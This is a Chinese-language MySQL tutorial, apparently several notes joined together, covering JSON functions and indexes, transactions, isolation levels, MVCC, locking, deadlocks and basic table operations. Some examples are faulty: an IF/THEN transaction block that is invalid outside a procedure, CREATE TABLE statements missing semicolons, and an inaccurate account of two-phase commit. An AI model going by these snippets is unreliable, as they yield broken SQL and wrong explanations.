UPDATE users SET profile = JSON_REMOVE(profile, '$.tags') WHERE id = 1;
```

**单行写法：JSON_ARRAY_APPEND 追加数组元素**
`JSON_ARRAY_APPEND(<JSON 列>, '<路径>', <值>)`
```sql
-- 向 tags 数组追加元素
UPDATE users SET profile = JSON_ARRAY_APPEND(profile, '$.tags', 'java') WHERE id = 1;
```

**单行写法：JSON_MERGE_PATCH 合并对象**
`JSON_MERGE_PATCH(<JSON 列>, '<JSON 对象>')`
```sql
-- 合并 JSON 对象（覆盖同 key）
UPDATE users SET profile = JSON_MERGE_PATCH(profile, '{"age": 33, "level": "senior"}') WHERE id = 1;
```

---

## JSON 查询与搜索函数

**单行写法：JSON_CONTAINS 判断包含值**
`JSON_CONTAINS(<JSON 列>, '<JSON 值>'[, '<路径>'])`
```sql
-- 判断 tags 数组是否包含 dev
SELECT * FROM users WHERE JSON_CONTAINS(profile->'$.tags', '"dev"');
```

**单行写法：JSON_CONTAINS_PATH 判断包含路径**
`JSON_CONTAINS_PATH(<JSON 列>, 'one|all', '<路径>'[, '<路径>'...])`
```sql
-- 判断是否包含 email 路径
SELECT * FROM users WHERE JSON_CONTAINS_PATH(profile, 'one', '$.email');
```

**单行写法：JSON_SEARCH 搜索值返回路径**
`JSON_SEARCH(<JSON 列>, 'one|all', '<值>')`
```sql
-- 搜索 Alice 值并返回路径
SELECT JSON_SEARCH(profile, 'one', 'Alice') FROM users;
```

**单行写法：JSON_KEYS 获取所有 key**
`JSON_KEYS(<JSON 列>[, '<路径>'])`
```sql
-- 获取 JSON 对象的所有 key
SELECT JSON_KEYS(profile) FROM users WHERE id = 1;
```

**单行写法：JSON_LENGTH 获取长度**
`JSON_LENGTH(<JSON 列>[, '<路径>'])`
```sql
-- 获取 tags 数组的长度
SELECT JSON_LENGTH(profile->'$.tags') FROM users WHERE id = 1;
```

**单行写法：JSON_TYPE 获取类型**
`JSON_TYPE(<JSON 值>)`
```sql
-- 获取 name 字段的数据类型
SELECT JSON_TYPE(profile->'$.name') FROM users WHERE id = 1;
```

**单行写法：JSON_VALID 判断有效性**
`JSON_VALID('<JSON 字符串>')`
```sql
-- 判断字符串是否为有效 JSON
SELECT JSON_VALID('{"a":1}');
```

---

## JSON_TABLE

**换行写法：JSON_TABLE 基本语法**
`JSON_TABLE(<JSON 文档>, <路径> COLUMNS (<列定义>) ) [AS] <别名>`
```sql
-- 将 JSON 数组展开为关系表
SELECT
    o.id AS order_id,
    jt.product_id,
    jt.name,
    jt.qty,
    jt.price,
    jt.qty * jt.price AS subtotal
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        product_id INT PATH '$.product_id',
        name       VARCHAR(50) PATH '$.name',
        qty        INT PATH '$.qty',
        price      DECIMAL(10,2) PATH '$.price'
    )
) AS jt;
```

**换行写法：NESTED PATH 嵌套展开**
`NESTED PATH '<路径>' COLUMNS (<列定义>)`
```sql
-- 嵌套 JSON 结构展开
SELECT
    o.id,
    jt.product_id,
    jt.name,
    nt.color,
    nt.stock
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        product_id INT PATH '$.product_id',
        name       VARCHAR(50) PATH '$.name',
        NESTED PATH '$.variants[*]' COLUMNS (
            color VARCHAR(20) PATH '$.color',
            stock INT PATH '$.stock'
        )
    )
) AS jt;
```

**换行写法：ORDINALITY 列生成行号**
`<列名> FOR ORDINALITY`
```sql
-- 自动生成行号
SELECT
    jt.row_num,
    jt.name
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        row_num FOR ORDINALITY,
        name VARCHAR(50) PATH '$.name'
    )
) AS jt
WHERE o.id = 1;
```

**换行写法：处理缺失值**
`<列名> <类型> PATH '<路径>' DEFAULT '<默认值>' ON EMPTY`
```sql
-- 缺失值使用默认值
SELECT * FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        name VARCHAR(50) PATH '$.name',
        discount DECIMAL(5,2) PATH '$.discount' DEFAULT '0.00' ON EMPTY
    )
) AS jt;
```

---

## JSON 索引优化

**换行写法：虚拟列索引**
`ALTER TABLE <表名> ADD COLUMN <列名> <类型> GENERATED ALWAYS AS (<表达式>) VIRTUAL, ADD INDEX <索引名> (<列名>)`
```sql
-- 为 JSON 字段创建虚拟列加索引
ALTER TABLE users
ADD COLUMN name_virtual VARCHAR(50)
    GENERATED ALWAYS AS (JSON_UNQUOTE(profile->'$.name')) VIRTUAL,
ADD INDEX idx_name (name_virtual);
```

**单行写法：查询虚拟列索引**
`SELECT * FROM <表名> WHERE <虚拟列名> = <值>`
```sql
-- 查询走虚拟列索引
SELECT * FROM users WHERE name_virtual = 'Alice';
```

**换行写法：函数索引**
`ALTER TABLE <表名> ADD INDEX <索引名> ((<表达式>))`
```sql
-- 直接创建函数索引（MySQL 8.0+）
ALTER TABLE users
ADD INDEX idx_json_name ((CAST(profile->>'$.name' AS CHAR(50))));
```

**换行写法：多值索引**
`ALTER TABLE <表名> ADD INDEX <索引名> ((CAST(<JSON 列> AS <类型> ARRAY)))`
```sql
-- 为 JSON 数组创建多值索引（MySQL 8.0.17+）
ALTER TABLE users
ADD INDEX idx_tags ((CAST(profile->'$.tags' AS CHAR(50) ARRAY)));
```

**单行写法：MEMBER OF 查询**
`<值> MEMBER OF(<JSON 列>)`
```sql
-- 使用 MEMBER OF 查询数组包含值
SELECT * FROM users WHERE 'dev' MEMBER OF(profile->'$.tags');
```

**单行写法：JSON_OVERLAPS 查询**
`JSON_OVERLAPS(<JSON 列>, '<JSON 数组>')`
```sql
-- 使用 JSON_OVERLAPS 查询数组交集
SELECT * FROM users WHERE JSON_OVERLAPS(profile->'$.tags', '["dev", "java"]');
```

<!-- ============ 文档分隔线：020-mysql/073-TransactionLockMechanism.md ============ -->

## 1. 事务特性 (ACID)

### 1.1 原子性 (Atomicity)

- **定义**：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败
- **实现原理**：通过 Undo Log 实现，当事务失败时，回滚到事务开始前的状态
- **示例**：银行转账操作，扣款和存款要么同时成功，要么同时失败

### 1.2 一致性 (Consistency)

- **定义**：事务执行前后，数据库从一个一致性状态转换到另一个一致性状态
- **实现原理**：由应用程序和数据库共同保证，数据库确保数据的完整性约束
- **示例**：转账前后，两个账户的总金额保持不变

### 1.3 隔离性 (Isolation)

- **定义**：多个事务并发执行时，一个事务的执行不应影响其他事务的执行
- **实现原理**：通过锁机制和 MVCC 实现
- **示例**：两个事务同时操作同一数据时，不会互相干扰

### 1.4 持久性 (Durability)

- **定义**：事务提交后，其结果永久保存到数据库，即使系统崩溃也不会丢失
- **实现原理**：通过 Redo Log 实现，事务提交时将修改记录到 Redo Log
- **示例**：事务提交后，即使数据库重启，修改仍然存在

## 2. 事务隔离级别 (Isolation Levels)

### 2.1 隔离级别的类型

| 隔离级别                    | 脏读   | 不可重复读 | 幻读            | 并发性能 |
| :-------------------------- | :----- | :--------- | :-------------- | :------- |
| 读未提交 (Read Uncommitted) | 可能   | 可能       | 可能            | 最高     |
| 读已提交 (Read Committed)   | 不可能 | 可能       | 可能            | 高       |
| 可重复读 (Repeatable Read)  | 不可能 | 不可能     | 不可能 (InnoDB) | 中       |
| 串行化 (Serializable)       | 不可能 | 不可能     | 不可能          | 最低     |

### 2.2 各隔离级别的特点

#### 2.2.1 读未提交 (Read Uncommitted)

- **特点**：事务可以读取其他事务未提交的数据
- **问题**：可能出现脏读
- **适用场景**：对数据一致性要求不高的场景

#### 2.2.2 读已提交 (Read Committed)

- **特点**：事务只能读取其他事务已提交的数据
- **问题**：可能出现不可重复读
- **适用场景**：大多数应用场景

#### 2.2.3 可重复读 (Repeatable Read)

- **特点**：MySQL InnoDB 默认隔离级别，保证同一事务中多次读取同一数据的结果一致
- **问题**：在其他数据库中可能出现幻读，但 InnoDB 通过 Next-Key Lock 解决了这个问题
- **适用场景**：对数据一致性要求较高的场景

#### 2.2.4 串行化 (Serializable)

- **特点**：事务串行执行，完全隔离
- **问题**：并发性能最差
- **适用场景**：对数据一致性要求极高的场景

### 2.3 设置隔离级别

```sql
 SELECT @@transaction_isolation;
 SET GLOBAL transaction_isolation = 'READ-COMMITTED';
 SET SESSION transaction_isolation = 'REPEATABLE-READ';
```

## 3. MVCC (多版本并发控制)

### 3.1 MVCC 概述

MVCC (Multi-Version Concurrency Control) 是 InnoDB 实现隔离级别的核心技术，它通过保存数据的多个版本，实现了读写并发，提高了数据库的并发性能。

### 3.2 MVCC 的工作原理

#### 3.2.1 数据版本管理

- **行记录中的隐藏列**：
- `DB_TRX_ID`：事务 ID，记录最后修改该行的事务 ID
- `DB_ROLL_PTR`：回滚指针，指向 Undo Log 中的历史版本
- `DB_ROW_ID`：行 ID，自增，用于聚簇索引

#### 3.2.2 Undo Log

- **作用**：保存数据的历史版本，用于事务回滚和 MVCC
- **类型**：
- `INSERT Undo Log`：记录插入操作，事务提交后可删除
- `UPDATE Undo Log`：记录更新操作，事务提交后需要保留，用于 MVCC
- `DELETE Undo Log`：记录删除操作，事务提交后需要保留，用于 MVCC

#### 3.2.3 ReadView

- **作用**：判断数据版本的可见性
- **组成**：
- `m_ids`：当前活跃事务的 ID 集合
- `min_trx_id`：活跃事务中最小的 ID
- `max_trx_id`：下一个将要分配的事务 ID
- `creator_trx_id`：创建 ReadView 的事务 ID

#### 3.2.4 可见性判断规则

- 如果数据的 `DB_TRX_ID` 等于 `creator_trx_id`，则可见
- 如果数据的 `DB_TRX_ID` 小于 `min_trx_id`，则可见
- 如果数据的 `DB_TRX_ID` 大于等于 `max_trx_id`，则不可见
- 如果数据的 `DB_TRX_ID` 在 `m_ids` 中，则不可见；否则可见

### 3.3 MVCC 在不同隔离级别下的表现

- **读未提交**：不使用 MVCC，直接读取最新数据
- **读已提交**：每次查询都会创建新的 ReadView
- **可重复读**：事务开始时创建 ReadView，之后不再创建
- **串行化**：不使用 MVCC，使用锁机制

## 4. 锁机制 (Locks)

### 4.1 锁的分类

#### 4.1.1 按粒度分类

- **行锁**：锁定单行数据，粒度最小，并发性能最高
- **页锁**：锁定数据页，粒度中等
- **表锁**：锁定整个表，粒度最大，并发性能最低

#### 4.1.2 按类型分类

- **共享锁 (S Lock)**：读锁，允许并发读，阻塞写
- **排他锁 (X Lock)**：写锁，阻塞读写
- **意向共享锁 (IS Lock)**：表级锁，表示事务准备对表中的某些行加共享锁
- **意向排他锁 (IX Lock)**：表级锁，表示事务准备对表中的某些行加排他锁

#### 4.1.3 按算法分类

- **记录锁 (Record Lock)**：锁定单行记录
- **间隙锁 (Gap Lock)**：锁定索引间隙，防止插入
- **临键锁 (Next-Key Lock)**：记录锁 + 间隙锁，解决幻读
- **插入意向锁 (Insert Intention Lock)**：插入操作时的间隙锁

### 4.2 锁的使用场景

#### 4.2.1 共享锁

```sql
 SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;
```

#### 4.2.2 排他锁

```sql
 SELECT * FROM users WHERE id = 1 FOR UPDATE;
 inSERT INTO users (name) VALUES ('John');
 UPDATE users SET name = 'John' WHERE id = 1;
 delete FROM users WHERE id = 1;
```

#### 4.2.3 间隙锁和临键锁

- **间隙锁**：在可重复读隔离级别下，使用范围查询时会自动添加间隙锁
- **临键锁**：InnoDB 默认使用的锁算法，解决幻读问题

### 4.3 锁的兼容性

|                 | 共享锁 (S) | 排他锁 (X) | 意向共享锁 (IS) | 意向排他锁 (IX) |
| :-------------- | :--------- | :--------- | :-------------- | :-------------- |
| 共享锁 (S)      | 兼容       | 冲突       | 兼容            | 冲突            |
| 排他锁 (X)      | 冲突       | 冲突       | 冲突            | 冲突            |
| 意向共享锁 (IS) | 兼容       | 冲突       | 兼容            | 兼容            |
| 意向排他锁 (IX) | 冲突       | 冲突       | 兼容            | 兼容            |

## 5. 死锁 (Deadlocks)

### 5.1 死锁的定义

死锁是指两个或多个事务相互等待对方释放锁的状态，导致所有事务都无法继续执行。

### 5.2 死锁的产生条件

- **互斥条件**：资源不能被共享，一次只能被一个事务使用
- **请求与保持条件**：事务已经保持了至少一个资源，又提出了新的资源请求
- **不剥夺条件**：事务获得的资源在未使用完之前，不能被强行剥夺
- **循环等待条件**：若干事务之间形成头尾相接的循环等待资源关系

### 5.3 死锁的检测与处理

#### 5.3.1 死锁检测

```sql
 SHOW ENGINE INNODB STATUS;
 SET GLOBAL innodb_deadlock_detect = ON;
```

#### 5.3.2 死锁处理

- **自动检测**：InnoDB 会自动检测死锁，并回滚其中一个事务
- **手动处理**：当死锁检测关闭时，需要手动处理

### 5.4 死锁的预防

- **按固定顺序访问表**：避免循环等待
- **减小事务粒度**：减少事务持有锁的时间
- **使用索引**：避免全表扫描，减少锁的范围
- **避免长时间事务**：尽快提交或回滚事务
- **使用较低的隔离级别**：减少锁的竞争
- **设置合理的锁超时**：`SET SESSION innodb_lock_wait_timeout = 30;`

## 6. 事务的实现原理

### 6.1 日志系统

#### 6.1.1 Redo Log

- **作用**：保证事务的持久性
- **工作原理**：事务提交时，将修改记录到 Redo Log，即使系统崩溃，重启后也可以通过 Redo Log 恢复数据
- **特点**：顺序写入，性能高

#### 6.1.2 Undo Log

- **作用**：保证事务的原子性和 MVCC
- **工作原理**：记录数据的历史版本，用于事务回滚和 MVCC 查询
- **特点**：逆序写入，支持多版本

### 6.2 两阶段提交

- **准备阶段**：事务将修改写入 Undo Log 和 Redo Log，但不提交
- **提交阶段**：事务提交，释放锁

### 6.3 事务的状态

- **活跃 (Active)**：事务正在执行
- **部分提交 (Partially Committed)**：事务执行完成，但修改还未写入磁盘
- **提交 (Committed)**：事务已提交
- **失败 (Failed)**：事务执行失败
- **中止 (Aborted)**：事务已回滚

## 7. 事务的最佳实践

### 7.1 事务设计最佳实践

- **保持事务简短**：减少事务持有锁的时间
- **避免在事务中进行网络操作**：网络操作可能导致事务长时间持有锁
- **避免在事务中进行大量计算**：计算操作可能导致事务长时间持有锁
- **合理设置隔离级别**：根据业务需求选择合适的隔离级别
- **使用批量操作**：减少事务数量

### 7.2 锁的使用最佳实践

- **使用索引**：避免全表扫描，减少锁的范围
- **选择合适的锁粒度**：根据业务需求选择合适的锁粒度
- **避免死锁**：按固定顺序访问表，减小事务粒度
- **使用乐观锁**：对于并发冲突较少的场景，使用乐观锁
- **监控锁等待**：定期检查锁等待情况

### 7.3 性能优化

- **使用连接池**：减少连接创建和销毁的开销
- **批量提交**：减少事务提交的次数
- **合理使用索引**：提高查询效率，减少锁的竞争
- **监控事务性能**：定期分析慢事务
- **优化 SQL**：减少事务中的复杂查询

## 8. 实际案例分析

### 8.1 案例 1：死锁排查

**问题**：应用程序出现死锁错误
**分析**：

1. 查看死锁日志：`SHOW ENGINE INNODB STATUS;`
2. 发现两个事务相互等待对方的锁
3. 分析 SQL 语句，发现访问表的顺序不同
   **解决方案**：
4. 统一访问表的顺序
5. 减小事务粒度
6. 使用索引优化查询

### 8.2 案例 2：事务性能优化

**问题**：事务执行时间过长，导致并发性能下降
**分析**：

1. 查看慢查询日志
2. 发现事务中包含大量计算和网络操作
3. 事务持有锁的时间过长
   **解决方案**：
4. 将计算和网络操作移到事务外
5. 拆分大事务为小事务
6. 优化 SQL 查询

### 8.3 案例 3：隔离级别选择

**问题**：应用程序出现幻读
**分析**：

1. 检查隔离级别：`SELECT @@transaction_isolation;`
2. 发现使用的是读已提交隔离级别
3. 业务需求需要可重复读
   **解决方案**：
4. 将隔离级别设置为可重复读：`SET SESSION transaction_isolation = 'REPEATABLE-READ';`
5. 优化查询，使用索引

## 9. 常见问题与解决方案

### 9.1 事务超时

**问题**：事务执行时间过长，导致超时
**解决方案**：

- 减小事务粒度
- 优化 SQL 查询
- 增加超时时间：`SET SESSION innodb_lock_wait_timeout = 60;`

### 9.2 死锁

**问题**：应用程序出现死锁错误
**解决方案**：

- 按固定顺序访问表
- 减小事务粒度
- 使用索引优化查询
- 监控死锁日志

### 9.3 并发性能低

**问题**：并发访问时性能下降
**解决方案**：

- 使用合理的隔离级别
- 优化锁的使用
- 提高索引效率
- 使用连接池

### 9.4 数据一致性问题

**问题**：事务执行后数据不一致
**解决方案**：

- 确保事务的 ACID 特性
- 使用合适的隔离级别
- 检查应用程序逻辑
- 定期备份数据

## 10. 总结

事务和锁机制是 MySQL 数据库并发控制的核心，通过理解 ACID 特性、隔离级别、MVCC 原理和锁机制，可以有效地设计和优化数据库应用，提高并发性能，保证数据一致性。

### 核心要点

- **事务特性**：ACID（原子性、一致性、隔离性、持久性）
- **隔离级别**：读未提交、读已提交、可重复读、串行化
- **MVCC**：多版本并发控制，通过 Undo Log 和 ReadView 实现
- **锁机制**：行锁、表锁、共享锁、排他锁、间隙锁等
- **死锁**：预防和处理死锁的方法
- **最佳实践**：事务设计、锁的使用、性能优化

### 学习建议

- **实践**：通过实际操作熟悉事务和锁的使用
- **分析**：使用 `SHOW ENGINE INNODB STATUS;` 分析死锁
- **监控**：监控事务性能和锁等待情况
- **优化**：根据实际情况调整事务和锁的使用
- **持续学习**：关注 MySQL 的新特性和优化技巧

---

## 事务控制

**单行写法：开启事务**
`START TRANSACTION` / `BEGIN`
```sql
-- 开启事务
START TRANSACTION;
```

**换行写法：提交事务**
`COMMIT`
```sql
-- 提交事务并持久化变更
START TRANSACTION;
INSERT INTO users (username, email) VALUES ('张三', 'zhangsan@example.com');
UPDATE accounts SET balance = balance - 100 WHERE user_id = 1;
UPDATE accounts SET balance = balance + 100 WHERE user_id = 2;
COMMIT;
```

**单行写法：回滚事务**
`ROLLBACK`
```sql
-- 回滚事务撤销变更
ROLLBACK;
```

**换行写法：使用保存点**
`SAVEPOINT <保存点名>` / `ROLLBACK TO <保存点名>`
```sql
-- 使用保存点部分回滚
START TRANSACTION;
INSERT INTO users (username) VALUES ('张三');
SAVEPOINT sp1;
INSERT INTO users (username) VALUES ('李四');
ROLLBACK TO sp1;
COMMIT;
```

**单行写法：释放保存点**
`RELEASE SAVEPOINT <保存点名>`
```sql
-- 释放指定保存点
RELEASE SAVEPOINT sp1;
```

---

## 隔离级别

**单行写法：查看隔离级别**
`SELECT @@transaction_isolation`
```sql
-- 查看当前事务隔离级别
SELECT @@transaction_isolation;
```

**单行写法：查看旧变量名隔离级别**
`SELECT @@tx_isolation`
```sql
-- 查看旧版本隔离级别变量
SELECT @@tx_isolation;
```

**单行写法：设置会话隔离级别**
`SET SESSION TRANSACTION ISOLATION LEVEL <级别>`
```sql
-- 设置会话隔离级别为读已提交
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
```

**单行写法：设置全局隔离级别**
`SET GLOBAL TRANSACTION ISOLATION LEVEL <级别>`
```sql
-- 设置全局隔离级别为可序列化
SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE;
```

**单行写法：通过变量设置全局隔离级别**
`SET GLOBAL transaction_isolation = '<级别>'`
```sql
-- 通过变量设置全局隔离级别
SET GLOBAL transaction_isolation = 'READ-COMMITTED';
```

**单行写法：通过变量设置会话隔离级别**
`SET SESSION transaction_isolation = '<级别>'`
```sql
-- 通过变量设置会话隔离级别
SET SESSION transaction_isolation = 'REPEATABLE-READ';
```

---

## 锁机制

**单行写法：加共享锁**
`SELECT ... LOCK IN SHARE MODE`
```sql
-- 查询时加共享锁
SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;
```

**单行写法：加排他锁**
`SELECT ... FOR UPDATE`
```sql
-- 查询时加排他锁
SELECT * FROM users WHERE id = 1 FOR UPDATE;
```

**单行写法：INSERT 自动加排他锁**
`INSERT INTO <表名> (<列名>) VALUES (<值>)`
```sql
-- 插入操作自动加排他锁
INSERT INTO users (name) VALUES ('John');
```

**单行写法：UPDATE 自动加排他锁**
`UPDATE <表名> SET <列名> = <值> WHERE <条件>`
```sql
-- 更新操作自动加排他锁
UPDATE users SET name = 'John' WHERE id = 1;
```

**单行写法：DELETE 自动加排他锁**
`DELETE FROM <表名> WHERE <条件>`
```sql
-- 删除操作自动加排他锁
DELETE FROM users WHERE id = 1;
```

---

## 锁等待与超时

**单行写法：查看锁等待超时**
`SELECT @@innodb_lock_wait_timeout`
```sql
-- 查看锁等待超时时间
SELECT @@innodb_lock_wait_timeout;
```

**单行写法：设置锁等待超时**
`SET SESSION innodb_lock_wait_timeout = <秒数>`
```sql
-- 设置锁等待超时为 30 秒
SET SESSION innodb_lock_wait_timeout = 30;
```

---

## 死锁检测

**单行写法：查看 InnoDB 状态**
`SHOW ENGINE INNODB STATUS`
```sql
-- 查看死锁日志
SHOW ENGINE INNODB STATUS;
```

**单行写法：开启死锁检测**
`SET GLOBAL innodb_deadlock_detect = ON`
```sql
-- 开启死锁检测
SET GLOBAL innodb_deadlock_detect = ON;
```

---

## 事务实战

**换行写法：转账事务**
`START TRANSACTION; <DML>; COMMIT;`
```sql
-- 转账事务保证原子性
START TRANSACTION;
UPDATE accounts SET balance = balance - 1000 WHERE user_id = 1;
UPDATE accounts SET balance = balance + 1000 WHERE user_id = 2;
COMMIT;
```

**换行写法：条件提交**
`IF <条件> THEN COMMIT; ELSE ROLLBACK; END IF`
```sql
-- 检查余额后决定提交或回滚
START TRANSACTION;
UPDATE accounts SET balance = balance - 1000 WHERE user_id = 1;
UPDATE accounts SET balance = balance + 1000 WHERE user_id = 2;

IF (SELECT balance FROM accounts WHERE user_id = 1) < 0 THEN
  ROLLBACK;
ELSE
  COMMIT;
END IF;
```

**换行写法：订单创建事务**
`START TRANSACTION; <DML>; SET @变量; <DML>; COMMIT;`
```sql
-- 订单创建事务包含订单和订单项
START TRANSACTION;
INSERT INTO orders (user_id, total_amount) VALUES (1, 500);
SET @order_id = LAST_INSERT_ID();
INSERT INTO order_items (order_id, product_id, quantity, price) VALUES
  (@order_id, 101, 2, 200),
  (@order_id, 102, 1, 100);
UPDATE products SET stock = stock - 3 WHERE id IN (101, 102);
COMMIT;
```

**换行写法：悲观锁查询**
`SELECT ... FOR UPDATE`
```sql
-- 先锁定再更新
SELECT * FROM users WHERE id = 1 FOR UPDATE;
UPDATE users SET status = 0 WHERE last_login_time < '2023-01-01';
```

**换行写法：批量删除事务**
`START TRANSACTION; <DML>; COMMIT;`
```sql
-- 批量更新避免长事务
START TRANSACTION;
UPDATE users SET status = 0 WHERE last_login_time < '2023-01-01';
UPDATE stats SET inactive_users = inactive_users + 1;
COMMIT;
```

**单行写法：分批删除**
`DELETE FROM <表名> WHERE <条件> LIMIT <N>`
```sql
-- 分批删除避免锁表
DELETE FROM logs WHERE created_at < '2023-01-01' LIMIT 1000;
```

<!-- ============ 文档分隔线：020-mysql/074-MySQLConfigOps.md ============ -->

## 1. 基本操作 (Basic Ops)

### 1.1 数据库操作详解

#### 1.1.1 创建数据库

```sql
 SHOW DATABASES;
 CREATE DATABASE mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
 CREATE DATABASE IF NOT EXISTS mydb;
 CREATE DATABASE mydb;
 DROP DATABASE IF EXISTS mydb;
 use mydb;
 SELECT DATABASE();
 SHOW CREATE DATABASE mydb;
 ALTER DATABASE mydb CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
```

#### 1.1.2 字符集和排序规则详解

**常用字符集**：

- `utf8`（实际是 UTF-8 的 3 字节版本，不支持 emoji）
- `utf8mb4`（完整的 UTF-8，支持所有字符，包括 emoji）
- `latin1`（西欧字符集）
- `gbk`（中文扩展字符集）
  **常用排序规则**：
- `utf8mb4_unicode_ci`：基于 Unicode 排序规则，较为准确
- `utf8mb4_general_ci`：通用排序规则，性能较好
- `utf8mb4_0900_ai_ci`：MySQL 8.0 新增，更准确的排序
  **推荐配置**：

```sql
 CREATE DATABASE mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

### 1.2 表操作详解

#### 1.2.1 创建表

```sql
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT COMMENT '用户ID',
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  email VARCHAR(100) NOT NULL COMMENT '邮箱',
  password VARCHAR(255) NOT NULL COMMENT '密码（加密存储）',
  age INT UNSIGNED COMMENT '年龄',
  status TINYINT DEFAULT 1 COMMENT '状态：1-正常，0-禁用',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间'
 )
 DESCRIBE users;
 SHOW COLUMNS FROM users;
 SHOW CREATE TABLE users;
 SHOW TABLES;
 SHOW TABLE STATUS FROM mydb;
```

#### 1.2.2 修改表结构

```sql
 ALTER TABLE users ADD COLUMN phone VARCHAR(20) AFTER email;
 ALTER TABLE users ADD COLUMN last_login DATETIME AFTER updated_at;
 ALTER TABLE users MODIFY COLUMN age INT UNSIGNED NOT NULL DEFAULT 0;
 ALTER TABLE users CHANGE COLUMN username user_name VARCHAR(50) NOT NULL;
 ALTER TABLE users DROP COLUMN phone;
 ALTER TABLE users ADD INDEX idx_email (email);
 ALTER TABLE users ADD UNIQUE INDEX idx_username (username);
 ALTER TABLE orders ADD CONSTRAINT fk_user_id FOREIGN KEY (user_id) REFERENCES users(id);
 ALTER TABLE users RENAME TO customers;
 RENAME TABLE users TO customers, orders TO purchase_orders;
 DROP TABLE IF EXISTS users;
 TRUNCATE TABLE users;
```

#### 1.2.3 表结构设计示例

```sql
 CREATE TABLE orders (
  order_id BIGINT PRIMARY KEY AUTO_INCREMENT,
  order_no VARCHAR(32) NOT NULL UNIQUE COMMENT '订单编号',
  user_id BIGINT NOT NULL COMMENT '用户ID',
  total_amount DECIMAL(10,2) NOT NULL DEFAULT 0.00 COMMENT '订单总额',
  discount_amount DECIMAL(10,2) NOT NULL DEFAULT 0.00 COMMENT '优惠金额',
  pay_amount DECIMAL(10,2) NOT NULL DEFAULT 0.00 COMMENT '实付金额',
  pay_type TINYINT COMMENT '支付方式：1-微信 2-支付宝 3-银行卡',
  status TINYINT NOT NULL DEFAULT 1 COMMENT '订单状态：1-待付款 2-已付款 3-已发货 4-已收货 5-已取消',
  order_time DATETIME NOT NULL COMMENT '下单时间',
  pay_time DATETIME COMMENT '支付时间',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_user_id (user_id),
  INDEX idx_order_time (order_time),
  INDEX idx_status (status)
 )
 CREATE TABLE order_items (
  item_id BIGINT PRIMARY KEY AUTO_INCREMENT,
  order_id BIGINT NOT NULL COMMENT '订单ID',
  product_id BIGINT NOT NULL COMMENT '商品ID',
  product_name VARCHAR(100) NOT NULL COMMENT '商品名称（冗余）',
  sku_id BIGINT COMMENT 'SKU ID',
  sku_name VARCHAR(100) COMMENT 'SKU名称（冗余）',
  price DECIMAL(10,2) NOT NULL COMMENT '商品单价',
  quantity INT NOT NULL DEFAULT 1 COMMENT '购买数量',
  subtotal DECIMAL(10,2) NOT NULL COMMENT '小计金额',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (order_id) REFERENCES orders(order_id) ON DELETE CASCADE,
  INDEX idx_order_id (order_id),
  INDEX idx_product_id (product_id)
 )
```

### 1.3 数据操作详解

#### 1.3.1 插入数据

```sql
 inSERT INTO users (username, email, password, age) VALUES ('张三', 'zhangsan@example.com', 'encrypted_pass', 25);
 inSERT INTO users (username, email) VALUES ('李四', 'lisi@example.com');
 inSERT INTO users (username, email, password, age) VALUES
 ('王五', 'wangwu@example.com', 'pass1', 30),
 ('赵六', 'zhaoliu@example.com', 'pass2', 28),
 ('钱七', 'qianqi@example.com', 'pass3', 35);
 inSERT INTO users (username, email, age)
 SELECT username, email, age FROM old_users WHERE status = 1;
 inSERT INTO users SET username='孙八', email='sunba@example.com', age=27;
 inSERT INTO users (id, username, email) VALUES (1, '张三', 'new_email@example.com')
 ON DUPLICATE KEY UPDATE email='new_email@example.com', updated_at=NOW();
 replace INTO users (id, username, email) VALUES (1, '张三', 'new_email@example.com');
 SELECT LAST_INSERT_ID();
```

#### 1.3.2 查询数据

```sql
 SELECT * FROM users;
 SELECT id, username, email FROM users;
 SELECT id AS user_id, username AS name FROM users;
 SELECT DISTINCT status FROM users;
 SELECT COUNT(DISTINCT status) FROM users;
 SELECT * FROM users LIMIT 10;
 SELECT * FROM users LIMIT 10 OFFSET 20;
 SELECT * FROM users LIMIT 20, 10;
 SELECT username, price, quantity, price * quantity AS total FROM order_items;
 SELECT * FROM users WHERE age > 25 AND status = 1;
 SELECT * FROM users WHERE age BETWEEN 20 AND 30;
 SELECT * FROM users WHERE username LIKE '张%';
 SELECT * FROM users WHERE email IN ('a@example.com', 'b@example.com');
 SELECT * FROM users ORDER BY created_at DESC;
 SELECT * FROM users ORDER BY age ASC, created_at DESC;
 SELECT status, COUNT(*) AS count FROM users GROUP BY status;
 SELECT status, AVG(age) AS avg_age FROM users GROUP BY status HAVING AVG(age) > 25;
 SELECT u.username, o.order_no, o.total_amount
 from users u
 inNER JOIN orders o ON u.id = o.user_id
 WHERE o.status = 2;
```

#### 1.3.3 更新数据

```sql
 UPDATE users SET age = 26 WHERE id = 1;
 UPDATE users SET age = age + 1 WHERE age < 30;
 UPDATE users SET age = 27, email = 'new_email@example.com', updated_at = NOW() WHERE id = 1;
 UPDATE users SET status = 0 WHERE created_at < '2024-01-01';
 START TRANSACTION;
 UPDATE accounts SET balance = balance - 100 WHERE id = 1;
 UPDATE accounts SET balance = balance + 100 WHERE id = 2;
 commit;
 SELECT * FROM users WHERE id = 1 FOR UPDATE;
 UPDATE users SET age = 26 WHERE id = 1;
```

#### 1.3.4 删除数据

```sql
 delete FROM users WHERE id = 1;
